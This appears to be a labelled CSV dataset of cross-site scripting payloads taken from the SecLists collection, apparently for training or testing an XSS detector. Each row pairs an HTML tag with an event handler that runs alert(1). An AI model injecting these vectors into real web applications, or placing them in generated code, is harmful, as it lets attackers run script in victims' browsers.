payload,label,source
<rb id=x tabindex=1 onfocusin=alert(1)></rb>,xss,seclists
"<rb onbeforecopy=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb onbeforepaste=""alert(1)"" contenteditable>test</rb>",xss,seclists
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,xss,seclists
"<rb onclick=""alert(1)"">test</rb>",xss,seclists
"<rb oncontextmenu=""alert(1)"">test</rb>",xss,seclists
"<rb oncopy=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb oncut=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb ondblclick=""alert(1)"">test</rb>",xss,seclists
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,xss,seclists
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb onkeypress=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rb onmousedown=""alert(1)"">test</rb>",xss,seclists
"<rb onmouseenter=""alert(1)"">test</rb>",xss,seclists
"<rb onmouseleave=""alert(1)"">test</rb>",xss,seclists
"<rb onmousemove=""alert(1)"">test</rb>",xss,seclists
"<rb onmouseout=""alert(1)"">test</rb>",xss,seclists
"<rb onmouseover=""alert(1)"">test</rb>",xss,seclists
"<rb onmouseup=""alert(1)"">test</rb>",xss,seclists
"<rb onpaste=""alert(1)"" contenteditable>test</rb>",xss,seclists
"<rp draggable=""true"" ondrag=""alert(1)"">test</rp>",xss,seclists
"<rp draggable=""true"" ondragend=""alert(1)"">test</rp>",xss,seclists
"<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>",xss,seclists
"<rp draggable=""true"" ondragleave=""alert(1)"">test</rp>",xss,seclists
"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",xss,seclists
<rp id=x tabindex=1 onactivate=alert(1)></rp>,xss,seclists
<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>,xss,seclists
<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>,xss,seclists
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,xss,seclists
<rp id=x tabindex=1 onfocus=alert(1)></rp>,xss,seclists
<rp id=x tabindex=1 onfocusin=alert(1)></rp>,xss,seclists
"<rp onbeforecopy=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp onbeforecut=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp onbeforepaste=""alert(1)"" contenteditable>test</rp>",xss,seclists
<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>,xss,seclists
"<rp onclick=""alert(1)"">test</rp>",xss,seclists
"<rp oncontextmenu=""alert(1)"">test</rp>",xss,seclists
"<rp oncopy=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp oncut=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp ondblclick=""alert(1)"">test</rp>",xss,seclists
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,xss,seclists
"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp onkeypress=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rp onmousedown=""alert(1)"">test</rp>",xss,seclists
"<rp onmouseenter=""alert(1)"">test</rp>",xss,seclists
"<rp onmouseleave=""alert(1)"">test</rp>",xss,seclists
"<rp onmousemove=""alert(1)"">test</rp>",xss,seclists
"<rp onmouseout=""alert(1)"">test</rp>",xss,seclists
"<rp onmouseover=""alert(1)"">test</rp>",xss,seclists
"<rp onmouseup=""alert(1)"">test</rp>",xss,seclists
"<rp onpaste=""alert(1)"" contenteditable>test</rp>",xss,seclists
"<rt draggable=""true"" ondrag=""alert(1)"">test</rt>",xss,seclists
"<rt draggable=""true"" ondragend=""alert(1)"">test</rt>",xss,seclists
"<rt draggable=""true"" ondragenter=""alert(1)"">test</rt>",xss,seclists
"<rt draggable=""true"" ondragleave=""alert(1)"">test</rt>",xss,seclists
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",xss,seclists
<rt id=x tabindex=1 onactivate=alert(1)></rt>,xss,seclists
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>,xss,seclists
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>,xss,seclists
<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>,xss,seclists
<rt id=x tabindex=1 onfocus=alert(1)></rt>,xss,seclists
<rt id=x tabindex=1 onfocusin=alert(1)></rt>,xss,seclists
"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",xss,seclists
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,xss,seclists
"<rt onclick=""alert(1)"">test</rt>",xss,seclists
"<rt oncontextmenu=""alert(1)"">test</rt>",xss,seclists
"<rt oncopy=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt oncut=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt ondblclick=""alert(1)"">test</rt>",xss,seclists
<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>,xss,seclists
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt onkeypress=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt onkeyup=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rt onmousedown=""alert(1)"">test</rt>",xss,seclists
"<rt onmouseenter=""alert(1)"">test</rt>",xss,seclists
"<rt onmouseleave=""alert(1)"">test</rt>",xss,seclists
"<rt onmousemove=""alert(1)"">test</rt>",xss,seclists
"<rt onmouseout=""alert(1)"">test</rt>",xss,seclists
"<rt onmouseover=""alert(1)"">test</rt>",xss,seclists
"<rt onmouseup=""alert(1)"">test</rt>",xss,seclists
"<rt onpaste=""alert(1)"" contenteditable>test</rt>",xss,seclists
"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",xss,seclists
"<rtc draggable=""true"" ondragend=""alert(1)"">test</rtc>",xss,seclists
"<rtc draggable=""true"" ondragenter=""alert(1)"">test</rtc>",xss,seclists
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",xss,seclists
"<rtc draggable=""true"" ondragstart=""alert(1)"">test</rtc>",xss,seclists
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>,xss,seclists
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,xss,seclists
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,xss,seclists
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>,xss,seclists
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,xss,seclists
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,xss,seclists
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc onbeforecut=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc onbeforepaste=""alert(1)"" contenteditable>test</rtc>",xss,seclists
<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>,xss,seclists
"<rtc onclick=""alert(1)"">test</rtc>",xss,seclists
"<rtc oncontextmenu=""alert(1)"">test</rtc>",xss,seclists
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc oncut=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc ondblclick=""alert(1)"">test</rtc>",xss,seclists
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,xss,seclists
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc onkeypress=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc onkeyup=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<rtc onmousedown=""alert(1)"">test</rtc>",xss,seclists
"<rtc onmouseenter=""alert(1)"">test</rtc>",xss,seclists
"<rtc onmouseleave=""alert(1)"">test</rtc>",xss,seclists
"<rtc onmousemove=""alert(1)"">test</rtc>",xss,seclists
"<rtc onmouseout=""alert(1)"">test</rtc>",xss,seclists
"<rtc onmouseover=""alert(1)"">test</rtc>",xss,seclists
"<rtc onmouseup=""alert(1)"">test</rtc>",xss,seclists
"<rtc onpaste=""alert(1)"" contenteditable>test</rtc>",xss,seclists
"<ruby draggable=""true"" ondrag=""alert(1)"">test</ruby>",xss,seclists
"<ruby draggable=""true"" ondragend=""alert(1)"">test</ruby>",xss,seclists
"<ruby draggable=""true"" ondragenter=""alert(1)"">test</ruby>",xss,seclists
"<ruby draggable=""true"" ondragleave=""alert(1)"">test</ruby>",xss,seclists
"<ruby draggable=""true"" ondragstart=""alert(1)"">test</ruby>",xss,seclists
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,xss,seclists
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>,xss,seclists
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,xss,seclists
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>,xss,seclists
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>,xss,seclists
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>,xss,seclists
"<ruby onbeforecopy=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby onbeforecut=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",xss,seclists
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,xss,seclists
"<ruby onclick=""alert(1)"">test</ruby>",xss,seclists
"<ruby oncontextmenu=""alert(1)"">test</ruby>",xss,seclists
"<ruby oncopy=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby ondblclick=""alert(1)"">test</ruby>",xss,seclists
<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>,xss,seclists
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby onkeyup=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<ruby onmousedown=""alert(1)"">test</ruby>",xss,seclists
"<ruby onmouseenter=""alert(1)"">test</ruby>",xss,seclists
"<ruby onmouseleave=""alert(1)"">test</ruby>",xss,seclists
"<ruby onmousemove=""alert(1)"">test</ruby>",xss,seclists
"<ruby onmouseout=""alert(1)"">test</ruby>",xss,seclists
"<ruby onmouseover=""alert(1)"">test</ruby>",xss,seclists
"<ruby onmouseup=""alert(1)"">test</ruby>",xss,seclists
"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",xss,seclists
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",xss,seclists
"<s draggable=""true"" ondragend=""alert(1)"">test</s>",xss,seclists
"<s draggable=""true"" ondragenter=""alert(1)"">test</s>",xss,seclists
"<s draggable=""true"" ondragleave=""alert(1)"">test</s>",xss,seclists
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",xss,seclists
<s id=x tabindex=1 onactivate=alert(1)></s>,xss,seclists
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,xss,seclists
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,xss,seclists
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,xss,seclists
<s id=x tabindex=1 onfocus=alert(1)></s>,xss,seclists
<s id=x tabindex=1 onfocusin=alert(1)></s>,xss,seclists
"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s onbeforecut=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",xss,seclists
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,xss,seclists
"<s onclick=""alert(1)"">test</s>",xss,seclists
"<s oncontextmenu=""alert(1)"">test</s>",xss,seclists
"<s oncopy=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s oncut=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s ondblclick=""alert(1)"">test</s>",xss,seclists
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>,xss,seclists
"<s onkeydown=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s onkeypress=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s onkeyup=""alert(1)"" contenteditable>test</s>",xss,seclists
"<s onmousedown=""alert(1)"">test</s>",xss,seclists
"<s onmouseenter=""alert(1)"">test</s>",xss,seclists
"<s onmouseleave=""alert(1)"">test</s>",xss,seclists
"<s onmousemove=""alert(1)"">test</s>",xss,seclists
"<s onmouseout=""alert(1)"">test</s>",xss,seclists
"<s onmouseover=""alert(1)"">test</s>",xss,seclists
"<s onmouseup=""alert(1)"">test</s>",xss,seclists
"<s onpaste=""alert(1)"" contenteditable>test</s>",xss,seclists
"<samp draggable=""true"" ondrag=""alert(1)"">test</samp>",xss,seclists
"<samp draggable=""true"" ondragend=""alert(1)"">test</samp>",xss,seclists
"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",xss,seclists
"<samp draggable=""true"" ondragleave=""alert(1)"">test</samp>",xss,seclists
"<samp draggable=""true"" ondragstart=""alert(1)"">test</samp>",xss,seclists
<samp id=x tabindex=1 onactivate=alert(1)></samp>,xss,seclists
<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>,xss,seclists
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,xss,seclists
<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>,xss,seclists
<samp id=x tabindex=1 onfocus=alert(1)></samp>,xss,seclists
<samp id=x tabindex=1 onfocusin=alert(1)></samp>,xss,seclists
"<samp onbeforecopy=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp onbeforecut=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp onbeforepaste=""alert(1)"" contenteditable>test</samp>",xss,seclists
<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,xss,seclists
"<samp onclick=""alert(1)"">test</samp>",xss,seclists
"<samp oncontextmenu=""alert(1)"">test</samp>",xss,seclists
"<samp oncopy=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp oncut=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp ondblclick=""alert(1)"">test</samp>",xss,seclists
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,xss,seclists
"<samp onkeydown=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp onkeypress=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp onkeyup=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<samp onmousedown=""alert(1)"">test</samp>",xss,seclists
"<samp onmouseenter=""alert(1)"">test</samp>",xss,seclists
"<samp onmouseleave=""alert(1)"">test</samp>",xss,seclists
"<samp onmousemove=""alert(1)"">test</samp>",xss,seclists
"<samp onmouseout=""alert(1)"">test</samp>",xss,seclists
"<samp onmouseover=""alert(1)"">test</samp>",xss,seclists
"<samp onmouseup=""alert(1)"">test</samp>",xss,seclists
"<samp onpaste=""alert(1)"" contenteditable>test</samp>",xss,seclists
"<script draggable=""true"" ondrag=""alert(1)"">test</script>",xss,seclists
"<script draggable=""true"" ondragend=""alert(1)"">test</script>",xss,seclists
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",xss,seclists
"<script draggable=""true"" ondragleave=""alert(1)"">test</script>",xss,seclists
"<script draggable=""true"" ondragstart=""alert(1)"">test</script>",xss,seclists
<script id=x tabindex=1 onactivate=alert(1)></script>,xss,seclists
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>,xss,seclists
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,xss,seclists
<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>,xss,seclists
<script id=x tabindex=1 onfocus=alert(1)></script>,xss,seclists
<script id=x tabindex=1 onfocusin=alert(1)></script>,xss,seclists
"<script onbeforecopy=""alert(1)"" contenteditable>test</script>",xss,seclists
"<script onbeforecut=""alert(1)"" contenteditable>test</script>",xss,seclists
"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",xss,seclists
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>,xss,seclists
"<script onclick=""alert(1)"">test</script>",xss,seclists
"<script oncontextmenu=""alert(1)"">test</script>",xss,seclists
"<script oncopy=""alert(1)"" contenteditable>test</script>",xss,seclists
"<script oncut=""alert(1)"" contenteditable>test</script>",xss,seclists
"<script ondblclick=""alert(1)"">test</script>",xss,seclists
<script onerror=alert(1) src=/></script>,xss,seclists
<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>,xss,seclists
"<script onkeydown=""alert(1)"" contenteditable>test</script>",xss,seclists
"<script onkeypress=""alert(1)"" contenteditable>test</script>",xss,seclists
"<script onkeyup=""alert(1)"" contenteditable>test</script>",xss,seclists
<script onload=alert(1) src=validjs.js></script>,xss,seclists
"<script onmousedown=""alert(1)"">test</script>",xss,seclists
"<script onmouseenter=""alert(1)"">test</script>",xss,seclists
"<script onmouseleave=""alert(1)"">test</script>",xss,seclists
"<script onmousemove=""alert(1)"">test</script>",xss,seclists
"<script onmouseout=""alert(1)"">test</script>",xss,seclists
"<script onmouseover=""alert(1)"">test</script>",xss,seclists
"<script onmouseup=""alert(1)"">test</script>",xss,seclists
"<script onpaste=""alert(1)"" contenteditable>test</script>",xss,seclists
<script onreadystatechange=alert(1)></script>,xss,seclists
"<section draggable=""true"" ondrag=""alert(1)"">test</section>",xss,seclists
"<section draggable=""true"" ondragend=""alert(1)"">test</section>",xss,seclists
"<section draggable=""true"" ondragenter=""alert(1)"">test</section>",xss,seclists
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",xss,seclists
"<section draggable=""true"" ondragstart=""alert(1)"">test</section>",xss,seclists
<section id=x tabindex=1 onactivate=alert(1)></section>,xss,seclists
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,xss,seclists
<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>,xss,seclists
<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>,xss,seclists
<section id=x tabindex=1 onfocus=alert(1)></section>,xss,seclists
<section id=x tabindex=1 onfocusin=alert(1)></section>,xss,seclists
"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",xss,seclists
"<section onbeforecut=""alert(1)"" contenteditable>test</section>",xss,seclists
